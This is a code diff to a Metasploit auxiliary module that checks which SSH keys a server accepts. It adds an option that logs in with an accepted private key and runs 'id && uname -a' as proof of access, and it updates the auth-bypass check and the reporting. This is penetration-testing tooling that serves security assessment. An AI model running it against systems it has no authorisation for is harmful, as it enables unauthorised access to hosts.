@@ -61,7 +61,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SSH_KEYFILE_B64', [false, 'Base64-encoded SSH public or unencrypted private key data (intended for programmatic use only)', '']),
         OptBool.new('SSH_BYPASS', [ false, 'When a key is accepted, test whether the server allows command execution without completing authentication', false]),
         OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
-        OptInt.new('SSH_TIMEOUT', [ false, 'Maximum time in seconds to negotiate an SSH session', 30])
+        OptInt.new('SSH_TIMEOUT', [ false, 'Maximum time in seconds to negotiate an SSH session', 30]),
+        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
       ]
     )
 
@@ -322,21 +323,19 @@ class MetasploitModule < Msf::Auxiliary
       opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
       begin
-        ssh_socket = nil
         success = false
         verifier = Net::SSH::PubkeyVerifier.new(ip, user, opt_hash)
         ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
           success = verifier.verify
-          ssh_socket = verifier.connection
         end
 
-        if datastore['SSH_BYPASS'] && ssh_socket
+        if datastore['SSH_BYPASS'] && verifier.connection
           data = nil
 
           print_status("#{ip}:#{rport} SSH - User #{user} is being tested for authentication bypass...")
 
           begin
-            ::Timeout.timeout(5) { data = ssh_socket.exec!("help\nid\nuname -a").to_s }
+            ::Timeout.timeout(5) { data = verifier.connection.exec!("help\nid\nuname -a").to_s }
           rescue StandardError
             nil
           end
@@ -365,9 +364,34 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         begin
-          ::Timeout.timeout(1) { ssh_socket.close if ssh_socket }
+          ::Timeout.timeout(1) { verifier.connection&.close }
         rescue StandardError
           nil
+        end
+
+        proof = nil
+        if success && datastore['GatherProof'] && !key_data[:private].empty?
+          begin
+            auth_opts = {
+              auth_methods: ['publickey'],
+              port: port,
+              key_data: [key_data[:private]],
+              use_agent: false,
+              config: false,
+              proxy: factory,
+              non_interactive: true,
+              verify_host_key: :never
+            }
+
+            auth_opts[:verbose] = :debug if datastore['SSH_DEBUG']
+            ::Timeout.timeout(10) do
+              Net::SSH.start(ip, user, auth_opts) do |conn|
+                proof = conn.exec!('id && uname -a').to_s
+              end
+            end
+          rescue StandardError
+            nil
+          end
         end
       rescue Rex::ConnectionError
         return :connection_error
@@ -393,12 +417,17 @@ class MetasploitModule < Msf::Auxiliary
 
       any_accepted = true
       key_label = key_data[:source] || "key #{key_idx + 1}"
-      print_good "#{ip}:#{rport} - [#{key_idx + 1}/#{testable_keys.size}] #{key_label}: accepted for #{user} (#{key_fingerprint}) - Private Key: #{private_key_present ? 'Yes' : 'No'}"
+      id_line, uname_line = proof.to_s.split("\n", 2)
+      msg = "#{ip}:#{rport} - [#{key_idx + 1}/#{testable_keys.size}] #{key_label}: accepted for #{user} (#{key_fingerprint}) - Private Key: #{private_key_present ? 'Yes' : 'No'}"
+      msg += " '#{id_line.strip}'" unless id_line.to_s.strip.empty?
+      print_good msg
+      print_brute level: :vgood, ip: ip, msg: uname_line.strip if uname_line
 
       key_hash = {
         data: key_data,
         key: key,
-        private_key_present: private_key_present
+        private_key_present: private_key_present,
+        proof: proof
       }
       do_report(ip, rport, user, key_hash)
     end
@@ -410,22 +439,39 @@ class MetasploitModule < Msf::Auxiliary
 
     key_fingerprint = key[:key].fingerprint('SHA256')
     store_public_keyfile(ip, user, key_fingerprint, key[:data][:public])
-    private_key_present = key[:private_key_present]
 
     # Store a note relating to the public key test
     note_information = {
       user: user,
       public_key: key[:data][:public],
-      private_key: private_key_present
+      private_key: key[:private_key_present]
     }
-
     report_note(
-    	host: ip,
-    	port: port,
-    	type: 'ssh.publickey.accepted',
-    	data: note_information,
-    	update: :unique_data
-  	)
+      host: ip,
+      port: port,
+      proto: 'tcp',
+      sname: 'ssh',
+      type: 'ssh.accepted_keys',
+      data: note_information,
+      update: :unique_data
+    )
+
+    if key[:proof].present?
+      id_part, uname_part = key[:proof].to_s.split("\n", 2)
+      report_note(
+        host: ip,
+        port: port,
+        proto: 'tcp',
+        sname: 'ssh',
+        type: 'ssh.proof',
+        data: {
+          credential: "#{user}:#{key_fingerprint}",
+          id: id_part.to_s.strip,
+          uname: uname_part.to_s.strip
+        },
+        update: :unique_data
+      )
+    end
 
     report_vuln(
       host: ip,
